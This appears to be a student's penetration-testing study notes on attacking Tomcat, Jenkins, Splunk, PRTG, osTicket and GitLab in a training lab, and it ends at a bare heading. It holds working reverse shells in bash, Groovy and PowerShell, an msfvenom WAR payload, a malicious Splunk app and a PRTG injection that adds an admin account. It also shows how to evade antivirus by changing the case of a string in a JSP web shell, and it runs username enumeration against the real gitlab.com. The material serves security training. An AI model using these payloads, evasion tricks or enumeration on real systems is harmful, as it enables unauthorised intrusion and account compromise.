If we click on `backup`, we will get redirected to `http://web01.inlanefreight.local:8180/backup/` and get a `404 Not Found` error. We need to specify the `cmd.jsp` file in the URL as well. Browsing to `http://web01.inlanefreight.local:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server.

```bash
$ curl -s http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

To upgrade to a reverse shell, I added this [reverse shell](https://www.revshells.com/) to the id field and started the listener

```bash
bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
```

gained a shell successfully!

```bash
$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
tomcat@app02:/$ whoami
whoami
tomcat
tomcat@app02:/$ find -name tomcat_flag.txt 2>/dev/null
./opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt

```

We could also use `msfvenom` to generate a malicious WAR file. The payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file. Browse to the Tomcat 
console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

The [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process shown above, but we'll leave this as an exercise for the reader.

[This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded `cmd.jsp` would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).

The web shell as is only gets detected by 2/58 anti-virus vendors from Virustotal.

A simple change such as changing:

```java
FileOutputStream(f);stream.write(m);o="Uploaded:
```

to:

```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the time of writing.

- **Note on Web Shells:** When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.

### **CVE-2020-1938 : Ghostcat**

Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in 
proxying requests to application servers behind the front-end web servers.

The AJP service is usually running at port 8009 on a Tomcat server.

```bash
$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

The above scan confirms that ports 8080 and 8009 are open. The PoC code for the vulnerability can be found [here](https://github.com/Debojit2003/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/tree/main). The exploit can only read files and folders within the web apps folder, which means that files like `/etc/passwd` can’t be accessed. Let’s attempt to access the web.xml.

```bash
$ python3 ghostcat.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.

## Jenkins - Discovery & Enumeration

---

[Jenkins](https://www.jenkins.io/) is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat.

### Discovery/Footprinting

Let's assume we are working on an internal penetration test and have completed our web discovery scans. We notice what we believe is a Jenkins instance and know it is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.

Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. 
Administrators can also allow or disallow users from creating accounts.

### Enumeration

```bash
$ nmap jenkins.inlanefreight.local                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 11:34 +03
Nmap scan report for jenkins.inlanefreight.local (10.129.57.115)
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8009/tcp open  ajp13
8080/tcp open  http-proxy
8180/tcp open  unknown
8888/tcp open  sun-answerbook
```

The default installation typically uses Jenkins’ database to store credentials and does not allow
 users to register an account. We can fingerprint Jenkins quickly by the telltale login page.

![Jenkins login page with fields for username and password, and 'Keep me signed in' option.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/jenkins_login.png)

We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin`
 or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test. While rare, we have come across Jenkins during external penetration tests that we were able to attack.

![Screenshot_2026-04-08_11_39_25.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/b595692e-eae6-4fb2-90c4-048a8929cbbf.png)

After we logged in as admin:admin, we can see that the version is 2.303.1

## Attacking Jenkins

Jenkins has a [Script console](https://www.jenkins.io/doc/book/managing/script-console/) feature this script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account, so it can be an easy win for us.

### Script Console

we can reach this feature by navigating to `/script` endpoint. Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell. For example, we can use the following snippet to run the `id` command.

- [Groovy Documentation](https://www.groovy-lang.org/)

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

![Screenshot_2026-04-08_11_52_14.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/251582c0-0a58-4a1d-9f66-e415d6b9f3b4.png)

To gain a reverse shell:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

or we can use [this](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) Metasploit model

Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). We could run commands on a Windows-based Jenkins install using this snippet:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

We could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host

# Splunk

## **Splunk - Discovery & Enumeration**

Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised.

The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.

### Discovery / Footprinting

Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times. Let's imagine that we uncover a forgotten instance of Splunk in our Aquatone report that has since automatically converted to the free version, which does not require authentication. Since we have yet to gain a foothold in the internal network, let's focus our attention on Splunk and see if we can turn this access into RCE.

The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme` The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking 
for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

We can discover Splunk with a quick Nmap service scan. Here we can see that Nmap identified the `Splunkd httpd` service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API

```bash
$ sudo nmap 10.129.57.206 -sV           
Host is up (0.77s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Enumeration

The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication

Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.

```bash
https://10.129.201.50:8000/en-US/app/launcher/home
```

![Splunk Enterprise Explore page with options to add data, access Splunk apps, and view documentation.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/splunk_home.png)

Splunk has multiple ways of running code,such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. 

As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. 

Aside from this built-in functionality, Splunk has suffered from various public vulnerabilities over the years, such as this [SSRF](https://www.exploit-db.com/exploits/40895) that could be used to gain unauthorized access to the Splunk REST API.

## Attacking Splunk

Splunk version is 8.2.2 and as discussed in the previous section, we can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts. From the Nmap discovery scan, we noticed that our target is a Windows server. Since Splunk comes with Python installed, we can create a custom Splunk application that gives us remote code execution using Python or a PowerShell script.

### Abusing Built-In Functionality

We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. We first need to create a custom Splunk application using the following directory structure.

```bash
$ tree reverse_shell_splunk
reverse_shell_splunk
├── bin
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default
    └── inputs.conf
```

the inputs.conf file is the configuration file that tells splunk to launch the run.bat file in the bin directory and at what interval. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

```bash
$ cat reverse_shell_splunk/default/inputs.conf 
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

> “ Because splunk only runs .bat files, the call inside "run.bat" is to a file with its same name. When run.bat is called, run.ps1 being in the same directory and having the same name will be run.”
> 

```bash
─$ cat reverse_shell_splunk/bin/run.bat 
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit 
```

Also update the PS and python script with your attacking ip and listening port, lastly create an archive 

```bash
$ tar -cvzf updater.tar.gz reverse_shell_splunk 
reverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/bin/run.bat
```

The next step is to choose `Install app from file` and upload the application.

```bash
https://10.129.201.50:8000/en-US/manager/search/apps/local
```

![Splunk Enterprise Apps page listing apps with options to browse, install from file, and create new apps.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/install_app.png)

start the listener before uploading it 

```bash
$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.94] from (UNKNOWN) [10.129.201.50] 52124

PS C:\Windows\system32> whoami
nt authority\system
```

As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

![Screenshot_2026-04-09_13_26_11.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/be3a33f7-a079-4112-a02d-532609893dfa.png)

In this case, we got a shell back as `NT AUTHORTY\SYSTEM`. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain.

## **PRTG Network Monitor**

[PRTG Network Monitor](https://www.paessler.com/prtg) is agentless network monitor software. It can be used to monitor 
bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more.

Over the years, PRTG has suffered from [26 vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) that were assigned CVEs. Of all of these, only four have easy-to-find public exploit PoCs, two cross-site scripting (XSS), one Denial of 
Service, and one authenticated command injection vulnerability which we will cover in this section. Here is a write-up for exploiting authenticated command injection vulnerability → https://0xdf.gitlab.io/2019/06/29/htb-netmon.html

### Discovery / Fingerprinting / Enumeration

```bash
$ sudo nmap 10.129.201.50 -sV  --open           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 13:55 +03
Nmap scan report for 10.129.201.50
Host is up (2.2s latency).
Not shown: 866 closed tcp ports (reset), 125 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the Nmap scan above, we can see the service `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detected on port 8080.

![Screenshot_2026-04-09_13_55_54.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d24d2881-6286-4cd9-98da-dbc084e5bedd.png)

THe default credentials is `prtgadmin:prtgadmin` we can try this fist. Our first attempt to log in with the default credentials fails, but a few tries later, we are in with `prtgadmin:Password123`.

Now to exploit the vulnerability [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) we first need to check the version if it is vulnerable or not

```bash
$ curl -s "http://10.129.201.50:8080/index.htm" | grep "version"
<span class="prtgversion">&nbsp;PRTG Network Monitor 18.1.37.13946 </span>

```

The vulnerability exist in versions before 18.2.39, so the target is vulnerable

### **Leveraging Known Vulnerabilities**

This [blog post](https://www.codewatch.org/blog/?p=453) explains the details of the vulnerability, so when creating a new notification, the `Parameter` field is passed directly into a PowerShell script without any type of input sanitization.

To begin, Hover on `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`. Next, click on `Add new notification`.

![Screenshot_2026-04-09_14_31_31.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/84b6632e-25f0-48c5-9acf-f833ccc1b55e.png)

Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down, lastly, in the parameter field enter the PS command you want to inject, here we added this command to create a new account in the Administrators group

```powershell
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

![Screenshot_2026-04-09_14_16_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/a5aab90f-2400-43ee-9b39-f3e18b441ca0.png)

Save the configuration, then you will return to the notifications and from there activate the notification by clicking on the notification and selecting from the right column `Send Test Notification`  (the alarm emojy)

![Screenshot_2026-04-09_14_17_33.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/94344364-040f-4813-a809-5ec12f57adcd.png)

TO confirm the execution, we can use `CrackMapExec` to confirm local admin access

```bash
$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

after confirming, I logged in to the target: 

```bash
$ evil-winrm -i 10.129.201.50 -u prtgadm1 -p "Pwn3d_by_PRTG\!"

*Evil-WinRM* PS C:\Users\prtgadm1\Documents> whoami
app03\prtgadm1

```

I also tried to add reverse shell and it worked

```powershell
$client = New-Object System.Net.Sockets.TCPClient('attackerIP',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

once I send the notification, I got a reverse shell

```bash
$ rlwrap nc -lvnp 4443 
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
APP03
```

# Customer Service Mgmt & Configuration Management

## **osTicket**

[osTicket](https://osticket.com/) is an open-source support ticketing system.osTicket can integrate user inquiries from email, phone, and web-based forms into a web interface. osTicket is written in PHP and uses a MySQL backend. It can be installed on Windows or Linux. 

Aside from learning about enumerating and attacking osTicket, the purpose of this section is also to introduce you to the world of support ticketing systems and why they should not be overlooked during our assessments.

### Discovery / Fingerprinting / Enumerating

```powershell
$ sudo nmap 10.129.201.88 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 15:24 +03
Nmap scan report for support.inlanefreight.local (10.129.201.88)
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8081/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`osTicket` is a web application that is highly maintained and serviced. If we look at the [CVEs](https://www.cvedetails.com/vendor/2292/Osticket.html)
 found over decades, we will not find many vulnerabilities and exploits that osTicket could have. This is an excellent example to show how important it is to understand how a web application works.Even if the application is not vulnerable, it can still be used for our purposes. Here we can break down the main functions into the layers:

**1. User Input (The Hook)**

The attacker exploits the primary purpose of the application: communication between users and staff. Since osTicket is open-source, an attacker can study its documentation to understand administrative hierarchies. By "playing dumb" and submitting a ticket regarding a simulated technical issue, the attacker uses **social engineering** to initiate contact and lower the staff's guard.

**2. Processing (The Investigation)**

Once a ticket is submitted, staff members attempt to reproduce the error. This often happens in internal or staging environments that mirror production systems. During this stage, the attacker relies on the staff’s professional diligence; the more "complex" or "internal" the bug seems, the more deeply the staff will engage with the attacker’s provided information or malicious context.

**3. Solution (The Information Harvest)**

As the "problem" escalates, more technical departments are looped into the email or ticket thread. This phase provides the attacker with high-value intelligence, including:

- **New Email Addresses:** Directly identifying internal technical staff.
- **Usernames:** Establishing a naming convention for the company.
- **OSINT Targets:** Using these names/emails to pivot to other services or conduct deeper reconnaissance on specific employees.

### Attacking osTicket

A search for osTicket on exploit-db shows various issues, including remote file inclusion, SQL injection, arbitrary file upload, XSS, etc. osTicket version 1.14.1 suffers from [CVE-2020-24881](https://nvd.nist.gov/vuln/detail/CVE-2020-24881)
 which was an SSRF vulnerability. If exploited, this type of flaw may be leveraged to gain access to internal resources or perform internal port scanning.

Aside from web application-related vulnerabilities, support portals can sometimes be used to obtain an email address for a company domain, which can be used to sign up for other exposed applications requiring an email verification to be sent. As mentioned earlier in the module, this 
is illustrated in the HTB weekly release box [Delivery](https://0xdf.gitlab.io/2021/05/22/htb-delivery.html) 

Create a ticket

![Screenshot_2026-04-14_14_17_19.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/5343ee72-7b8e-416d-914c-9a51eb074568.png)

Upon creating the ticket we got a temporary email with the company’s domain so we can track our ticket

![Screenshot_2026-04-14_14_18_21.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d1185258-9319-4704-8997-b3c77bdec91b.png)

```python
id: 792546.
792546@inlanefreight.local.
```

Now we can use this new email to register to other portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, and use the help desk support portal to receive a sign-up confirmation email.

![Screenshot_2026-04-14_14_22_47.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/7a4439c2-a71a-4121-bcce-b1d953239f5e.png)

### **osTicket - Sensitive Data Exposure**

Let's say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool [Dehashed](http://dehashed.com/) (for our purposes, the sample data below is fictional).

```bash
$ sudo python3 dehashed.py -q inlanefreight.local -p

id : 5996447501
email : julie.clayton@inlanefreight.local
username : jclayton
password : JulieC8765!
hashed_password : 
name : Julie Clayton
vin : 
address : 
phone : 
database_name : ModBSolutions

id : 7344467234
email : kevin@inlanefreight.local
username : kgrimes
password : Fish1ng_s3ason!
hashed_password : 
name : Kevin Grimes
vin : 
address : 
phone : 
database_name : MyFitnessPal
```

we have also performed subdomain enumeration and come across several interesting ones.

```bash
$ cat ilfreight_subdomains

vpn.inlanefreight.local
support.inlanefreight.local
...
legacy.inlanefreight.local
```

We browse to each subdomain and find that many are defunct, but the `support.inlanefreight.local` and `vpn.inlanefreight.local` are active and very promising. `Support.inlanefreight.local` is hosting an osTicket instance, and `vpn.inlanefreight.local` is a Barracuda SSL VPN web portal that does not appear to be using multi-factor authentication.

On the support portal, The kevin user credentials worked and it appears that he is a support user and our open ticket is shown to him

```bash
http://support.inlanefreight.local/scp/login.php
```

![Screenshot_2026-04-14_14_40_07.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d9c4bed4-405a-4ef7-901e-8803bc99fab0.png)

and also there is a clonsed ticket

![Screenshot_2026-04-14_14_41_06.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/42474c72-a078-4d02-af48-699931c240ee.png)

As shown below, the agent commits an error and send the password to the user directly via the portal. From here, we could try this password against the exposed VPN portal as the user may not have changed it.

![Screenshot_2026-04-14_14_43_36.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/e8b75459-f6e0-4768-b163-68345e1ffbb9.png)

Furthermore, the support agent states that this is the standard password given to new joiners and sets the user's password to this value. We have been in many organizations where the helpdesk uses a standard password for new users and password resets. Often the domain password policy is lax and does not force the user to change at the next login. If this is the case, it may work for other users. 

### The Attack Path

The primary risk stems from **external support portals** that allow users to create tickets or accounts. If a portal automatically assigns a legitimate company email address to a guest user, that user might gain unauthorized access to other internal services or sensitive data via "Single Sign-On" (SSO) or email-based verification.

Additionally, gaining access to a help desk agent’s queue exposes sensitive information leaks, often exacerbated by **password reuse** across multiple platforms.

### Recommended Defensive Measures

Organizations can mitigate these risks by implementing several core security controls:

- **Attack Surface Reduction:** Limit the number of applications exposed to the public internet to only what is strictly necessary.
- **Strong Authentication:** Enforce **Multi-Factor Authentication (MFA)** on every external-facing portal.
- **Identity Management:**
    - Prohibit common or easily guessable passwords (e.g., seasons, months, or company names).
    - Force password changes after the first login and set periodic expiration intervals.
- **Security Culture:** Train employees to avoid using corporate email addresses for third-party or personal services to prevent cross-platform credential harvesting.

- This [blog](https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c) describe how can attacker access to company’s internal communications  by using the created email from support portal. This [challenge](https://www.hackthebox.com/machines/delivery) simulates the vulnerability

## Gitlab - Discovery & Enumeration

[GitLab](https://about.gitlab.com/) is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality.

### Footprinting & Discovery

We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo.

- To view the version, navigate to the `/help` page

```bash

After registering an account I found the version -> GitLab Community Edition 13.10.2
```

If we cannot register an account, we may have to try a low-risk exploit such as [this](https://www.exploit-db.com/exploits/49821). We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly.

There have been a few serious exploits against GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) and GitLab [11.4.7](https://www.exploit-db.com/exploits/49257) in the past few years as well as GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), and [13.10.2](https://www.exploit-db.com/exploits/49951).

### Enumeration

There's not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to `/explore` and see if there are any public projects that may contain something interesting. 

![Screenshot_2026-04-14_16_57_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/00675c39-c5ba-4f30-87b3-fa17dee28ba4.png)

Public projects can be interesting because we may be able to use them to find out more about the company's infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key.

Browsing to the project, it looks like an example project and may not contain anything useful, though it is always worth digging around.

![Screenshot_2026-04-14_17_02_19.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/ce688459-5289-4676-a140-038a806b6143.png)

From here, we can explore each of the pages linked in the top left `groups`, `snippets`, and `help`.
 We can also use the search functionality and see if we can uncover any other projects. Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data.

We can also use the registration form to enumerate valid users.If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as `Dehashed` as seen in the osTicket section.

![Screenshot_2026-04-14_17_10_42.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/ff77f35d-d658-4811-bbff-82d58a410b2d.png)

Here, we can see the root username is taken, we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error 

```bash
1 error prohibited this user from being saved:  Email has already been taken
```

Some mitigations can be put in place for this, such as enforcing 2FA on all user accounts, using `Fail2Ban` to block failed login attempts which are indicative of brute-forcing attacks, and even restricting which IP addresses can access a GitLab instance if it must be accessible outside of the internal corporate network.

- In a real-world scenario, we may be able to find a considerable amount of sensitive data if we can register and gain access to any of their repositories. As this [blog post](https://tillsongalloway.com/finding-sensitive-information-on-github/index.html) explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc.

### Onwards

This section shows us the importance (and power) of enumeration and that not every single application we uncover has to be directly exploitable to still prove very interesting and useful for us during an engagement. This is especially true on external penetration tests where the attack 
surface is usually considerably smaller than an internal assessment. We may need to gather data from two or more sources to mount a successful attack.

## Attacking GitLab

As we saw in the previous section, even unauthenticated access to a GitLab instance could lead to sensitive data compromise. If we were able to gain access as a valid company user or an admin, we could potentially uncover enough data to fully compromise the organization in some way. GitLab has [553 CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html) reported as of September 2021.

### Username Enumeraion

Used this [repository](https://github.com/ahmed-al-ahmed/GitLabUserEnum) for username enumeration

```bash
$ python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
GitLab User Enumeration in Python
[+] The username root exists!
[+] The username administrator exists!
```

I also test it aginst [gitlab](https://gitlab.com/) website

```python
$ python3 gitlab_userenum.py --url https://gitlab.com --wordlist /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt  
GitLab User Enumeration in python
[+] The username root exists!
[+] The username test exists!
[+] The username guest exists!
[+] The username info exists!
[+] The username adm exists!
[+] The username user exists!
[+] The username administrator exists!
[+] The username puppet exists!
[+] The username ec2-user exists!
[+] The username vagrant exists!
[+] The username azureuser exists!
```

we can see we got two valid usernames: If we successfully pulled down a large list of users, we could attempt a controlled password spraying attack with weak, common passwords such as
 `Welcome1` or `Password123`, etc., or try to re-use credentials gathered from other sources such as password dumps from public data breaches.

### **Authenticated Remote Code Execution**

